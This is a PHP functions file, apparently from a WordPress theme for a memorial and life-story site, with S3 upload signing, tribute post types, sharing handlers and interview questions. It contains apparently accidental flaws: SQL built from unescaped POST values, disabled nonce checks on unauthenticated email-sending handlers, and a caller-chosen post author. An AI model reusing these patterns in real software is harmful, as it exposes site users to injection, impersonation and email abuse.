// simplicity, we set the expiration date to always be 24H in 
// the future. The two "starts-with" fields are used to restrict
// the content of "key" and "Content-Type", which are specified
// later in the POST fields. Again for simplicity, we use blank
// values ('') to not put any restrictions on those two fields.
    $policy = base64_encode(json_encode([
        'expiration' => gmdate('Y-m-d\TH:i:s\Z', time() + 86400),
        'conditions' => [
            ['acl' => $acl],
            ['bucket' => $bucket],
            ['starts-with', '$Content-Type', ''],
            ['starts-with', '$key', ''],
            ['x-amz-algorithm' => 'AWS4-HMAC-SHA256'],
            ['x-amz-credential' => $credential],
            ['x-amz-date' => $longDate]
        ]
    ]));

// SIGNATURE
// A base64-encoded HMAC hashed signature with your secret key.
// This is used so Amazon can verify your request, and will be
// passed along in a POST field later.
    $signingKey = hash_hmac('sha256', $shortDate, 'AWS4' . $secretKey, true);
    $signingKey = hash_hmac('sha256', $region, $signingKey, true);
    $signingKey = hash_hmac('sha256', 's3', $signingKey, true);
    $signingKey = hash_hmac('sha256', 'aws4_request', $signingKey, true);
    $signature = hash_hmac('sha256', $policy, $signingKey);

// CURL
// The cURL request. Passes in the full URL to your Amazon bucket.
// Sets RETURNTRANSFER and HEADER to true to see the full response from
// Amazon, including body and head. Sets POST fields for cURL.
// Then executes the cURL request.
    $ch = curl_init('https://' . $bucket . '.s3-' . $region . '.amazonaws.com');
//    var_dump('https://' . $bucket . '.s3-' . $region . '.amazonaws.com');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'Content-Type' => $fileType,
        'acl' => $acl,
        'key' => $fileName,
        'policy' => $policy,
        'x-amz-algorithm' => 'AWS4-HMAC-SHA256',
        'x-amz-credential' => $credential,
        'x-amz-date' => $longDate,
        'x-amz-signature' => $signature,
        'file' => new CurlFile(realpath($filePath), $fileType, $fileName)
    ]);
    $response = curl_exec($ch);
//    var_dump($response);
// RESPONSE
// If Amazon returns a response code of 204, the request was
// successful and the file should be sitting in your Amazon S3
// bucket. If a code other than 204 is returned, there will be an
// XML-formatted error code in the body. For simplicity, we use
// substr to extract the error code and output it.
    if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == 204) {
        return array('status' => true, 'filename' => $fileName, 'response' => $response, 'fileurl' => 'https://s3.' . $region . '.amazonaws.com/' . $bucket . '/' . $fileName);
    } else {
        $error = substr($response, strpos($response, '<Code>') + 6);
        $error = substr($error, 0, strpos($error, '</Code>'));
        return array('status' => false, 'error' => $error);
    }
}

add_action('init', 'register_contribution_post');

function register_contribution_post() {
    $post_type = 'legacy-contributions';
    $labels = array(
        'name' => _x('Contributions', 'post type general name', 'livinglegacy'),
        'singular_name' => _x('Contribution', 'post type singular name', 'livinglegacy'),
        'menu_name' => _x('Contributions', 'admin menu', 'livinglegacy'),
        'name_admin_bar' => _x('Contributions', 'add new on admin bar', 'livinglegacy'),
        'add_new' => _x('Add Contribution', 'livinglegacy'),
        'add_new_item' => __('Add New Contribution', 'livinglegacy'),
        'new_item' => __('New Contribution', 'livinglegacy'),
        'edit_item' => __('Edit Contribution', 'livinglegacy'),
        'view_item' => __('View Contribution', 'livinglegacy'),
        'all_items' => __('All Contributions', 'livinglegacy'),
        'search_items' => __('Search Contributions', 'livinglegacy'),
        'parent_item_colon' => __('Parent Contribution:', 'livinglegacy'),
        'not_found' => __('No Contributions found.', 'livinglegacy'),
        'not_found_in_trash' => __('No Contributions found in Trash.', 'livinglegacy')
    );

    $args = array(
        'labels' => $labels,
        'public' => true,
        'publicly_queryable' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'query_var' => true,
        'rewrite' => array('slug' => 'history'),
        'capability_type' => 'post',
        'has_archive' => true,
        'hierarchical' => false,
        'menu_position' => null,
        'supports' => array('title', 'author',)
    );
    register_post_type($post_type, $args);

    register_taxonomy('legacy-contribution-categories', $post_type, array(
        'label' => __('Contribution Categories'),
        'public' => true,
        'rewrite' => true,
        'hierarchical' => true,
            )
    );
	
	// Register new post type Tribute
	   $labels = array(
        'name' => _x('Tributes', 'post type general name', 'livinglegacy'),
        'singular_name' => _x('Tribute', 'post type singular name', 'livinglegacy'),
        'menu_name' => _x('Tributes', 'admin menu', 'livinglegacy'),
        'name_admin_bar' => _x('Tributes', 'add new on admin bar', 'livinglegacy'),
        'add_new' => _x('Add Tribute', 'livinglegacy'),
        'add_new_item' => __('Add New Tribute', 'livinglegacy'),
        'new_item' => __('New Tribute', 'livinglegacy'),
        'edit_item' => __('Edit Tribute', 'livinglegacy'),
        'view_item' => __('View Tribute', 'livinglegacy'),
        'all_items' => __('All Tributes', 'livinglegacy'),
        'search_items' => __('Search Tributes', 'livinglegacy'),
        'parent_item_colon' => __('Parent Tribute:', 'livinglegacy'),
        'not_found' => __('No Tributes found.', 'livinglegacy'),
        'not_found_in_trash' => __('No Tributes found in Trash.', 'livinglegacy')
    );

    $args = array(
        'labels' => $labels,
        'public' => true,
        'publicly_queryable' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'query_var' => true,
        'rewrite' => array('slug' => 'tribute'),
        'capability_type' => 'post',
        'has_archive' => true,
        'hierarchical' => false,
        'menu_position' => null,
        'supports' => array('title', 'author')
    );
    register_post_type('tributes', $args);
	 register_taxonomy('tribute-contribution-categories', 'tributes', array(
        'label' => __('Tribute Contribution Categories'),
        'public' => true,
        'rewrite' => true,
        'hierarchical' => true,
            )
    );
	
}
// save contributor log
function save_contributor_log($cont_email = '', $cont_media='', $type='media', $post_id='')
{
	global $wpdb;
	if(empty($cont_email)){
		return;
	}
	$con_table_name = $wpdb->prefix . CONTRIBUTOR_LOG;
	if($type=='media' and !empty($cont_media)){
		foreach($cont_media as $c_media){
			$media_id = $c_media['id'];
			$media_type = $c_media['type'];
			$is_exist = $wpdb->get_row( "SELECT id FROM $con_table_name WHERE media_id = '".$media_id."' and media_type='".$media_type."'" );
			// save new contributor log
			if($is_exist==null){
				 $wpdb->insert( 
                    $con_table_name, 
                    array(
                        'user_email' => $cont_email, 
						'p_id' => $post_id,
                        'media_id' => $media_id,
                        'media_type' => $media_type,
                        'media_recorded' => current_time( 'mysql' ) 
                    )
            	);
            	$fileID = $wpdb->insert_id;
			}
		}
	}elseif($type=='notes' and !empty($cont_media)){
		foreach($cont_media as $c_media){
			$note = $c_media['note'];
			 $wpdb->insert( 
                $con_table_name, 
                    array(
                        'user_email' => $cont_email, 
						'p_id' => $post_id,
                        'media_id' => mt_rand(),
                        'media_type' => 'notes',
						'notes'=>$note,
                        'media_recorded' => current_time( 'mysql' ) 
                    )
            	);
		}
	}
}

function ll_submit_contribution_callback () {
    check_ajax_referer( 'legacy_ajax_nonce', 'nonce' );
    $title =  $_POST['title'];
    $type = $_POST['type'];
    $media = $_POST['media'];
    $cont_media = !empty($_POST['cont_media']) ? $_POST['cont_media'] : '';	
	$cont_notes  = !empty($_POST['cont_notes']) ? $_POST['cont_notes'] : '';		
    $notes = $_POST['notes'];
    $contid = intval($_POST['contid']);
	$cont_email = !empty($_POST['cont_email']) ? $_POST['cont_email'] : '';
	
	$post_type = ($_POST['post_type']=='tributes') ? 'tributes' : 'legacy-contributions';
	$redirect_contribute = '';
	if(!empty($_POST['post_author_id'])){
		$redirect_contribute = site_url('/contributor-success/');
	}
	if(trim($title)==''){
		echo json_encode(array('status' => 'error', 'message'=>'Please add a title for the page.'));
		wp_die();
	}	
	$user_id = !empty($_POST['post_author_id']) ?  $_POST['post_author_id'] : get_current_user_id();
	if(empty($user_id)){
		echo json_encode(array('status' => 'error', 'message'=>'Please login to perform this action'));
		wp_die();
	}
	
    $post_array = array(
            'post_type' => $post_type,
            'post_author' => $user_id,
            'post_title' => $title,
            'post_status' => 'publish'
        );
    if ($contid === 0) {
        $post_id = wp_insert_post($post_array);
    }
    else {
        $post_array['ID'] = $contid;
        $post_id = wp_update_post($post_array);
    }
    if (!is_wp_error($post_id)) {
		if(!empty($_POST['post_author_id']) && !empty($cont_media) && $cont_email!=''){
			save_contributor_log($cont_email, $cont_media, 'media', $post_id);
		}
		
		if(!empty($_POST['post_author_id']) && !empty($cont_notes) && $cont_email!=''){
			save_contributor_log($cont_email, $cont_notes, 'notes', $post_id);
		}
		
		if($post_type=='legacy-contributions'){
        	wp_set_object_terms( $post_id, $type, 'legacy-contribution-categories');
		}else{ // tributes
		
			// only first time when tribute is publised
			if ( empty ( get_post_meta( $post_id, '_share_token') ) ) {			
					$unix_time_user = time().'_'.$user_id;			
					update_post_meta( $post_id, '_share_token', $unix_time_user);		
			}
			wp_set_object_terms( $post_id, $type, 'tribute-contribution-categories');
		}
        update_post_meta( $post_id, '_media', $media);
        update_post_meta( $post_id, '_notes', $notes);
       // $location = get_permalink(get_page_by_title( 'Contributor History' )) . '?id=' . $post_id . '&edit=true';
	   if(empty($redirect_contribute)){
	   	$location = get_the_permalink($post_id);
	   }else{
		   $location = $redirect_contribute;
	  }
        echo json_encode(array('status' => 'success', 'location' => $location));
    }
    die;
}
// tribute published 
function tributes_published_add_meta( $ID, $post ) {
	$author_id = $post->post_author;
	if ( empty ( get_post_meta($ID,'_share_token') ) ) {			
			$unix_time_user = time().'_'.$author_id;			
			update_post_meta( $$ID, '_share_token', $unix_time_user);		
		}
}

add_action( 'publish_tributes', 'tributes_published_add_meta', 10, 2 );

add_action('wp_ajax_ll_submit_contribution', 'll_submit_contribution_callback');
add_action('wp_ajax_nopriv_ll_submit_contribution', 'll_submit_contribution_callback');

function ll_fetch_recent_videos_callback () {
    check_ajax_referer( 'legacy_ajax_nonce', 'nonce' );
    global $wpdb;
    $pageID = intval($_POST['pageId']);
	$user_id = (!empty($_POST['user_id'])) ? intval($_POST['user_id']) : get_current_user_id();
	//echo "SELECT video_id FROM $addpipe_video_table_name WHERE `user_id`=$user_id AND `bypid`=$pageID AND `ap_wh_time` > NOW() - INTERVAL 40 SECOND";   
    $addpipe_video_table_name = $wpdb->prefix . LL_ADDPIPE_VIDEO;
    $results = $wpdb->get_col("SELECT video_id FROM $addpipe_video_table_name WHERE `user_id`=$user_id AND `bypid`=$pageID AND `ap_wh_time` > NOW() - INTERVAL 40 SECOND");
    $videos_details = array();
    if ($results) {
        foreach ($results as $video_id) {
            $video_id = intval($video_id);
            $details = ll_get_addpipe_video_details($video_id);
            $ll_video_details_s3 =  $details['videos'][0]['pipeS3Link'];
            $ll_video_details_snapshot =  $details['videos'][0]['snapshotURL'];
            $videos_details[] = array( 'id' => $video_id, 'url' => 'https://' . $ll_video_details_s3, 'thumbnail' => 'https://' . $ll_video_details_snapshot);
        }
    }
    echo json_encode($videos_details);
    die;
}
// send new user welcome email
function send_user_welcome_email($user_id = '')
{
	$user = get_userdata( $user_id );
	if($user){
		$to_email = $user->user_email;
		$subject = get_field('welcome_email__heading', 'option');
		$admin_email = get_bloginfo('admin_email');	
		$headers = 'From: ' . get_bloginfo('name') . ' <' . $admin_email . '>' . "\r\n";
		$site_url = site_url();
		$message = '<p style="margin:0 0 11px;">'.get_field('welcome_email_content', 'option').'</p>';
		
		ob_start();	
		include WP_CONTENT_DIR . '/themes/livinglegacy/templates/welcome-email-template.php';	 
		$email_template = ob_get_clean();
	
		add_filter('wp_mail_content_type', 'mail_set_content_type');							
		wp_mail($to_email, $subject, $email_template, $headers);	
		remove_filter('wp_mail_content_type', 'mail_set_content_type');
	}
}

add_action('wp_ajax_ll_fetch_recent_videos', 'll_fetch_recent_videos_callback');
add_action('wp_ajax_nopriv_ll_fetch_recent_videos', 'll_fetch_recent_videos_callback');

function share_post_with_people_callback() {
  
    parse_str($_POST['params'], $FORMPOST);
   // check_ajax_referer( 'legacy_ajax_nonce', 'nonce' );
    $info = array();
    $post_id = $FORMPOST['post_id'];
    $to_email = rtrim(trim($FORMPOST['emails'], ','));
    if(empty($to_email)){
		echo json_encode(array('message' => 'Please enter email address', 'status' =>'error'));
   		wp_die();
	}
	if(empty($post_id)){
		echo json_encode(array('message' => 'Post ID missing'));
   		wp_die();
	}
	// update post meta with shared user log
	$share_with_emails = explode(',', $to_email);
	$shared_email = get_post_meta(  $post_id, 'shared_emails' );
	if($shared_email) // already shared
	{
		if(count($share_with_emails) > 0){
			foreach($share_with_emails as $email){
				if(!in_array($email, $shared_email)){
					add_post_meta( $post_id, 'shared_emails', trim($email) );
				}
			}
		}
		
	}else{
		if(count($share_with_emails) > 0){
			foreach($share_with_emails as $email){
				add_post_meta( $post_id, 'shared_emails', trim($email) );
			}
		}
		
	}
	//echo 'EMAIL::'.$to_email;
	//die;
	$user_message = !empty($FORMPOST['share_comment']) ? $FORMPOST['share_comment'] : '';
	$current_user = wp_get_current_user(); 
	$admin_email = get_bloginfo('admin_email');	
	$subject = 	$current_user->display_name.' Shared a Link';
	// Send email to admin
	$headers = 'From: ' . get_bloginfo('name') . ' <' . $admin_email . '>' . "\r\n";
	//$message = "";
	$message .= '<p style="margin:0 0 11px;">Hi,</p>';
	$message .= '<p style="margin:0 0 11px;">' . $current_user->display_name . ' shared the following link with you.</p>';
	$message .= '<p style="margin:0 0 11px;">Click on the link to view a personal message or you may be asked to contribute stories or pictures</p><br>';
		
	$message .= $user_message;
	$site_url = site_url();
	if(count($share_with_emails) > 0){
		add_filter('wp_mail_content_type', 'mail_set_content_type');		
		foreach($share_with_emails as $email){			
			$share_link = '<p style="margin:0 0 23px;"><a href="' . site_url('tribute-shared-page/'). '?email='.trim($email).'&id='.$post_id.'">Click here to contribute</a></p>';						
				ob_start();	
				include WP_CONTENT_DIR . '/themes/livinglegacy/templates/share-email-template.php';	 
				$email_template = ob_get_clean();
				
				wp_mail($email, $subject, $email_template, $headers);
	
			}
			remove_filter('wp_mail_content_type', 'mail_set_content_type');
	}
	
    echo json_encode(array('message' => 'Successfully Sent.<br><a class="continue-creating" href="'.site_url('/feature-selection/').'">Continue creating.</a>', 'status' => 'success'));
    wp_die();
}
add_action('wp_ajax_share_post_with_people', 'share_post_with_people_callback');
// set email content type as HTML
function mail_set_content_type($content_type){
	return 'text/html';
}

function share_history_with_people_callback() {
  
    parse_str($_POST['params'], $FORMPOST);
   // check_ajax_referer( 'legacy_ajax_nonce', 'nonce' );
    $info = array();
    $post_id = $FORMPOST['post_id'];
    $to_email = rtrim($FORMPOST['emails'], ',');
    if(empty($to_email)){
		echo json_encode(array('message' => 'Please enter email address', 'status' =>'error'));
   		wp_die();
	}
	if(empty($post_id)){
		echo json_encode(array('message' => 'Post ID missing'));
   		wp_die();
	}
	// update post meta with shared user log
	//$share_with_emails = explode(',', $to_email);
	//echo 'EMAIL::'.$to_email;
	//die;
	$share_link = '';
	$user_message = !empty($FORMPOST['share_comment']) ? $FORMPOST['share_comment'] : '';
	$current_user = wp_get_current_user(); 
	$admin_email = get_bloginfo('admin_email');	
	$subject = 	'Livinglegacy Shared a Link';
	// Send email to admin
	$headers = 'From: ' . get_bloginfo('name') . ' <' . $admin_email . '>' . "\r\n";
	$message = "";
	$message .= '<p style="margin:0 0 11px;">Hi,</p>';
	$message .= '<p style="margin:0 0 11px;">The following link was shared with you..</p>';
	$message .= '<p style="margin:0 0 11px;">Click on the link to view a personal message or you may be asked to contribute stories or pictures</p>';
	$message .= '<p style="margin:0 0 23px;"><a href="' . get_the_permalink($post_id). '">Click here to view</a></p><br />';
	
	$message .= $user_message;
	$site_url = site_url();
	//echo 'CONETN::'.WP_CONTENT_DIR;
	ob_start();
	//echo get_stylesheet_directory_uri() . '/templates/share-email-template.php';
		include WP_CONTENT_DIR . '/themes/livinglegacy/templates/share-email-template.php';	 
	$email_template = ob_get_clean();
	//echo 'MESSAGE::'.$email_template;
	//die;
    //ob_end_clean();
	add_filter('wp_mail_content_type', 'mail_set_content_type');							
	wp_mail($to_email, $subject, $email_template, $headers);	
	remove_filter('wp_mail_content_type', 'mail_set_content_type');		
    echo json_encode(array('message' => 'Successfully Sent.<br><a class="continue-creating" href="'.site_url('/feature-selection/').'">Continue creating.</a>', 'status' => 'success'));
    wp_die();
}
add_action('wp_ajax_share_history_with_people', 'share_history_with_people_callback');
add_action('wp_ajax_nopriv_share_history_with_people', 'share_history_with_people_callback');

function share_site_with_people() {
  
    parse_str($_POST['params'], $FORMPOST);
   // check_ajax_referer( 'legacy_ajax_nonce', 'nonce' );
    $info = array();  
    $to_email = rtrim($FORMPOST['emails'], ',');
    if(empty($to_email)){
		echo json_encode(array('message' => 'Please enter email address', 'status' =>'error'));
   		wp_die();
	}
	
	// update post meta with shared user log
	//$share_with_emails = explode(',', $to_email);
	//echo 'EMAIL::'.$to_email;
	//die;
	$share_link = '';
	$user_message = !empty($FORMPOST['share_comment']) ? $FORMPOST['share_comment'] : '';
	$current_user = wp_get_current_user(); 
	$admin_email = get_bloginfo('admin_email');	
	$subject = get_field('invitation_heading', 'option');
	$subject = 	($subject) ? $subject : 'Livinglegacy Shared a Link';
	// Send email to admin
	$headers = 'From: ' . get_bloginfo('name') . ' <' . $admin_email . '>' . "\r\n";
	$message = "";		
	$message .= '<p style="margin:0 0 23px;">'.$user_message.'</p>';
	$site_url = site_url();
	//echo 'CONETN::'.WP_CONTENT_DIR;
	ob_start();
	//echo get_stylesheet_directory_uri() . '/templates/share-email-template.php';
		include WP_CONTENT_DIR . '/themes/livinglegacy/templates/share-email-template.php';	 
	$email_template = ob_get_clean();
	//echo 'MESSAGE::'.$email_template;
	//die;
    //ob_end_clean();
	add_filter('wp_mail_content_type', 'mail_set_content_type');							
	wp_mail($to_email, $subject, $email_template, $headers);	
	remove_filter('wp_mail_content_type', 'mail_set_content_type');		
    echo json_encode(array('message' => 'Successfully Sent.', 'status' => 'success'));
    wp_die();
}
add_action('wp_ajax_share_site_with_people', 'share_site_with_people');
add_action('wp_ajax_nopriv_share_site_with_people', 'share_site_with_people');
// invite question wit people
function invite_question_people() {
  
    parse_str($_POST['params'], $FORMPOST);
   // check_ajax_referer( 'legacy_ajax_nonce', 'nonce' );
    $info = array();  
    $to_email = rtrim($FORMPOST['emails'], ',');
    if(empty($to_email)){
		echo json_encode(array('message' => 'Please enter email address', 'status' =>'error'));
   		wp_die();
	}
	
	// update post meta with shared user log
	//$share_with_emails = explode(',', $to_email);
	//echo 'EMAIL::'.$to_email;
	//die;
	$share_link = '';
	$user_message = !empty($FORMPOST['share_comment']) ? $FORMPOST['share_comment'] : '';
	$current_user = wp_get_current_user(); 
	$admin_email = get_bloginfo('admin_email');	
	$subject = get_field('questions_page_invite_heading', 'option');
	$subject = 	($subject) ? $subject : 'Livinglegacy Shared a Link';
	// Send email to admin
	$headers = 'From: ' . get_bloginfo('name') . ' <' . $admin_email . '>' . "\r\n";
	$message = "";		
	$message .= '<p style="margin:0 0 23px;">'.$user_message.'</p>';
	$site_url = site_url();
	//echo 'CONETN::'.WP_CONTENT_DIR;
	ob_start();
	//echo get_stylesheet_directory_uri() . '/templates/share-email-template.php';
		include WP_CONTENT_DIR . '/themes/livinglegacy/templates/share-email-template.php';	 
	$email_template = ob_get_clean();
	//echo 'MESSAGE::'.$email_template;
	//die;
    //ob_end_clean();
	add_filter('wp_mail_content_type', 'mail_set_content_type');							
	wp_mail($to_email, $subject, $email_template, $headers);	
	remove_filter('wp_mail_content_type', 'mail_set_content_type');		
    echo json_encode(array('message' => 'Successfully Sent.', 'status' => 'success'));
    wp_die();
}
add_action('wp_ajax_invite_question_people', 'invite_question_people');
add_action('wp_ajax_nopriv_invite_question_people', 'invite_question_people');

function getRemoteFilesize($url, $formatSize = true, $useHead = true)
{
    if (false !== $useHead) {
        stream_context_set_default(array('http' => array('method' => 'HEAD')));
    }
    $head = array_change_key_case(get_headers($url, 1));
    // content-length of download (in bytes), read from Content-Length: field
    $clen = isset($head['content-length']) ? $head['content-length'] : 0;

    // cannot retrieve file size, return "-1"
    if (!$clen) {
        return -1;
    }

    if (!$formatSize) {
        return $clen; // return size in bytes
    }

    $size = $clen;
    // return in MB
     $size = round($clen / 1048576, 2);
  // return in GB
 // $size = round($clen / 1073741824, 2); 

    return $size; // return formatted size
}

function calculate_user_usages($user_id = '', $in_gb = false){
	
	if(empty($user_id)){
		return 0;
	}
	$contributions_args = array(
							'post_type' => array('legacy-contributions', 'tributes'),
							'post_status' => array('publish', 'pending'),
							'posts_per_page' => -1,
							'author' =>  $user_id,
					);
	$contributions_query = new WP_Query($contributions_args);
	$total_usages = 0;
	if ($contributions_query->have_posts()) { 
	 while ($contributions_query->have_posts()) {
			$contributions_query->the_post();
			$media_files = get_post_meta( get_the_ID(), '_media', true);
			if($media_files){
				foreach($media_files as $media_file){
					$file_url = $media_file['url'];
					if(!empty($media_file['url']) and $media_file['type']=='image'){
						 $uploaded_url = $media_file['url'];
						 //$is_video = check_is_video_image($uploaded_url);
						 $file_url = get_cloud_front_url($uploaded_url);						 
							
					}elseif($media_file['type']=='video' OR $media_file['type']=='audio'){
						$default_video = ll_get_addpipe_video_details($media_file['id']);
						$file_url =  'https://'.$default_video['videos'][0]['pipeS3Link'];	
					}					
					//$file_url = $media_file['url'];
					$space_usages = getRemoteFilesize($file_url); 
					if($space_usages > 0){
						$total_usages = $total_usages + $space_usages;
					}
				}
			}
				
		}
	}
	// return in GB
	if($in_gb){
		return round($total_usages * 1000, 3);
	}else{
		// return in MB
		return $total_usages;
	}
	
}
// Calculate users used space
add_action('calculate_users_used_space', 'calculate_total_users_used_space');
function calculate_total_users_used_space(){	
	set_time_limit(0);
	global $wpdb;
	$offset = get_option('space_offset_user_limit');
	if(!$offset){
		$offset = 0;
	}
	$args = array(	
		'number'       => 20,
		'offset'       => $offset,
		'fields'       => array( 'ID' ),
	 ); 
	$all_users = get_users( $args );
	//echo 'users:::<pre>';
	//print_r($all_users);
	// Array of stdClass objects.
	if($all_users){
		foreach ( $all_users as $user ) { 			
			$contributions_args = array(
							'post_type' => array('legacy-contributions', 'tributes'),
							'post_status' => array('publish', 'pending'),
							'posts_per_page' => -1,
							'author' =>  $user->ID,
					);
					$contributions_query = new WP_Query($contributions_args);
					$total_usages = 0;
					if ($contributions_query->have_posts()) { 
					 while ($contributions_query->have_posts()) {
							$contributions_query->the_post();
							$media_files = get_post_meta( get_the_ID(), '_media', true);
							if($media_files){
								foreach($media_files as $media_file){
									$file_url = $media_file['url'];
									if(!empty($media_file['url']) and $media_file['type']=='image'){
										 $uploaded_url = $media_file['url'];
										 //$is_video = check_is_video_image($uploaded_url);
										 $file_url = get_cloud_front_url($uploaded_url);						 
											
									}elseif($media_file['type']=='video' OR $media_file['type']=='audio'){
										$default_video = ll_get_addpipe_video_details($media_file['id']);
										$file_url =  'https://'.$default_video['videos'][0]['pipeS3Link'];	
									}					
									//$file_url = $media_file['url'];
									$space_usages = getRemoteFilesize($file_url); 
									if($space_usages > 0){
										$total_usages = $total_usages + $space_usages;
									}
								}
							}
								
						} // end of loop for media	
						//echo 'UID::'.$user->ID;
						//echo 'TOTAL::'.$total_usages;					
						// update user total used space	
						update_user_meta($user->ID, 'user_total_used_space', $total_usages);
						wp_reset_query();
					}
					
		}
		if(count($all_users) < 20){
			update_option('space_offset_user_limit', 0);
		}else{
			$offset = $offset + 20;
			update_option('space_offset_user_limit', $offset);
		}
	}
	
}
// get user total used space
function get_user_used_space($user_id = ''){
	if(empty($user_id)){
		return 0;
	}
	return get_user_meta( $user_id, 'user_total_used_space', true); 
}
/*
* Get user allocated space from user meta
*/
function get_user_package_space($user_id = ''){
	$user_allocated_space = 0;
	if(empty($user_id)){
		$user_id = get_current_user_id();
	}
	 $allocated_space = get_user_meta( $user_id, 'user_allocated_space', true ); 
	 if($allocated_space){
		 $user_allocated_space = $allocated_space;
	 }
	
	
	/*$mylevels = pmpro_getMembershipLevelsForUser($user_id);	
	$default_space = 5000;
	if(!empty($mylevels[0])){
		if($mylevels[0]->id==2){
			$default_space = 10000;
		}elseif($mylevels[0]->id==3){
			$default_space = 25000;
		}elseif($mylevels[0]->id==4){
			$default_space = 25000;
		}
	}*/
	
	// return in MB as it's stored as in MB with user meta
	return $user_allocated_space;
}


function get_author_fullname($author_id = ''){
	$fname = get_the_author_meta('first_name', $author_id);
	$lname = get_the_author_meta('last_name', $author_id);
	$full_name = '';
	$user_info = get_userdata($author_id );
	$level = pmpro_getMembershipLevelsForUser($author_id);
	if(!empty($level)){	
		if($level[0]->ID==4){ // it is free user		
			return $user_info->user_login;
		}
	}
	//echo '<pre>';
	//print_r($level);
	if( empty($fname)){
		$full_name = $lname;
	} elseif( empty( $lname )){
		$full_name = $fname;
	} else {
		//both first name and last name are present
		$full_name = "{$fname} {$lname}";
	}
	if(!empty($full_name)){
		return $full_name;
	}
	return $user_info->user_login;
}
// check user subscription has expired
function check_subscription_expired($user_id = ''){
	$level = pmpro_getMembershipLevelsForUser($user_id);	
	//echo '<pre>';
	//print_r($level);
	//echo 'EXPIRE::'.$level[0]->enddate;
	if(!empty($level[0]->enddate)){		
		$now = time();		
		if($level[0]->enddate < $now) {
			return true;
		}
	}
	
	return false;
}

add_action( 'show_user_profile', 'extra_user_meta_profile_fields' );
add_action( 'edit_user_profile', 'extra_user_meta_profile_fields' );

function extra_user_meta_profile_fields( $user ) { ?>
    <table class="form-table">
    <tr>
        <th><label for="address"><?php _e("User Allocated Space"); ?></label></th>
        <td>
            <input type="text" name="user_allocated_space" id="user_allocated_space" value="<?php echo esc_attr( get_the_author_meta( 'user_allocated_space', $user->ID ) ); ?>" class="regular-text" /><br />
            <span class="description"><?php _e("Please enter in MB (e.g 1000)."); ?></span>
        </td>
    </tr>
   
    </table>
<?php }

add_action( 'personal_options_update', 'save_extra_user_meta_profile_fields' );
add_action( 'edit_user_profile_update', 'save_extra_user_meta_profile_fields' );

function save_extra_user_meta_profile_fields( $user_id ) {
    if ( !current_user_can( 'edit_user', $user_id ) ) { 
        return false; 
    }
    update_user_meta( $user_id, 'user_allocated_space', $_POST['user_allocated_space'] );
}

// Fire hook when ever payment complete
add_action( 'woocommerce_payment_complete', 'payment_complete_additional_storage' );
function payment_complete_additional_storage( $order_id ){
   
 	$additional_storage = get_field('additional_storage', 'option');
    $order = wc_get_order( $order_id );
    //$user = $order->get_user();
	$user_id = $order->get_user_id( );
	$is_extra_storage = false;
    if( $user_id ){
        // do something with the user		
		$items = $order->get_items();
		foreach ( $items as $item ) {			
			$product_id = $item->get_product_id();
			// check if the prodcut is in additional storage category
			if ( has_term( 'additional-storage', 'product_cat', $product_id ) ) {
				
				$is_extra_storage = true;
				$item_quantity = $item->get_quantity();
				
			}
		}
		// Did we find any storage product
		if($is_extra_storage){
			$additional_storage = $additional_storage * $item_quantity;
			// Get user meta
			$user_storage = get_user_meta( $user_id, 'user_allocated_space', true ); 
			if(!$user_storage){
				$user_storage = 0;
			}
			// updated user storage			
			$updated_storage = ($additional_storage * 1000);
			$updated_storage =  ($user_storage + $updated_storage);
			
			update_user_meta( $user_id, 'user_allocated_space', $updated_storage );
		}
		
    }
}
// add logout menu

function add_logout_custom_menu( $items, $args ) {
 if ( $args->theme_location != 'mainmenu' ) {
 	return $items;
 }
 
 if ( is_user_logged_in() ) {
 	$items .= '<li><a href="' . wp_logout_url(home_url()) . '">' . __( 'Logout' ) . '</a></li>';
 } 
 
 return $items;
}
 
add_filter( 'wp_nav_menu_items', 'add_logout_custom_menu', 199, 2 );





function register_my_menus() {
  register_nav_menus(
    array(
      'footer-menu-1' => __( 'Footer About Menu' ),
      'footer-menu-2' => __( 'Footer Account Menu' )
    )
  );
}
add_action( 'init', 'register_my_menus' );



// removes Order Notes Title - Additional Information
add_filter( 'woocommerce_enable_order_notes_field', '__return_false' );

function get_question_with_id($qid = 0){
	$questions = array(
			'1'=>"Where is your family from? What was their experience coming to this country?",
			'2'=>"Describe you parents. What were they like? What did they do?",
			'3'=>"Describe your grandparents. What did you enjoy the most about them?",
			'4'=>"How did your grandparents meet?",
			'5'=>"What traditions did your relatives pass down to you?",
			'6'=>"What are some interesting things about your relatives?",
			'7'=>"More stories about my family heritage.",
			'8'=>"Where did you grow up and what was it like there?",
			'9'=>"What did you enjoy doing as a child?",
			'10'=>"How would you describe yourself as a child? Were you happy?",
			'11'=>"How would you describe a perfect day when you were young?",
			'12'=>"Do you have any favorite stories from your childhood?",
			'13'=>"Who were some of your friends growing up? What were they like?",
			'14'=>"What kind of trouble did you get into as a child?",
			'15'=>"How did you celebrate the holidays?",
			'16'=>"What did you like to do in your free time?",
			'17'=>"What were some of the crazy fads you or your friends went through?",
			'18'=>"What were your family finances like growing up and how did that affect you?",
			'19'=>"What were you like in high school?",
			'20'=>"What did you want to be when you grew up?",
			'21'=>"How did you celebrate your birthdays?",
			'22'=>"What was the most exciting thing that happened to you as adolescence?",
			'23'=>"What would people you know find surprising about you as a teen?",
			'24'=>"More stories about growing up.",
			'25'=>"Where and when did you go to school? Name all your schools.",
			'26'=>"What were your favorite subjects and teachers? Why?",
			'27'=>"How would your classmates remember you?",
			'28'=>"What are your best memories of elementary and high school? Worst memories?",
			'29'=>"What did you like most about school?  Least?",
			'30'=>"What are your most memorable college moments?",
			'31'=>"More stories about my school days.",
			'32'=>"How old were you when you went on your first date? What happened?",
			'33'=>"When did you first fall in love? What were the circumstances?",
			'34'=>"Can you tell me about your first kiss?",
			'35'=>"What was your first serious relationship?",
			'36'=>"What lessons have you learned from your relationships?",
			'37'=>"What are some memorable stories from early romances?",
			'38'=>"Have you had your heart broken? What happened?",
			'39'=>"More stories about my relationships.",
			'40'=>"How did you meet your husband/wife and what drew you to him/her?",
			'41'=>"Do you have a favorite incident from your courtship?",
			'42'=>"How did you know he/she was “the one�??",
			'43'=>"How did you propose?",
			'44'=>"What were the best times in your marriage? The most difficult times?",
			'45'=>"Did you ever get divorced? Can you tell me about it?",
			'46'=>"What was your wedding like? Describe everything.",
